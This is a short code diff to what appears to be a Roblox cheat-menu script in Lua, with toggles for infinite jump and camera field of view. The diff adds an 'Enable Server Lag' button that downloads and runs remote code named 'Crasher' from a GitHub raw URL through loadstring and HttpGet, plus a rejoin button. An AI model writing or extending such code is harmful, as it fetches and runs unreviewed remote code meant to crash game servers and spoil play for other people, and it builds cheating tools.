@@ -462,6 +462,10 @@ PlayerSection:AddToggle({ Name = "Infinite Jump", Flag = "Player_InfiniteJump", 
 PlayerSection:AddSlider({ Name = "Camera FOV", Flag = "Player_CameraFOV", Value = Settings.CameraFOV, Min = 1, Max = 120, Increment = 1, Callback = function(val) Settings.CameraFOV = val; Camera.FieldOfView = val; if cameraFOVNotifyTask then task.cancel(cameraFOVNotifyTask) end; cameraFOVNotifyTask = task.delay(0.5, function() ShowMenuNotification("Camera FOV set to " .. val) end) end })
 PlayerSection:AddToggle({ Name = "Lock FOV", Flag = "Player_LockFOV", Value = Settings.LockFOV, Callback = function(val) Settings.LockFOV = val; ShowMenuNotification("Lock FOV " .. (val and "Enabled" or "Disabled")) end })
 
+local ServerLagSection = PlayerTab:CreateSection({ Name = "Player Misc", Side = "Right" })
+ServerLagSection:AddButton({ Name = "Enable Server Lag", Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/dosi1100-cmyk/script/refs/heads/main/Crasher"))() end })
+ServerLagSection:AddButton({ Name = "Rejoin", Callback = function() game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId) end })
+
 local TeleportSection = TeleportTab:CreateSection({ Name = "Teleport Settings" })
 local SelectedPlayer = nil
 local TeleportFrontToggle = nil
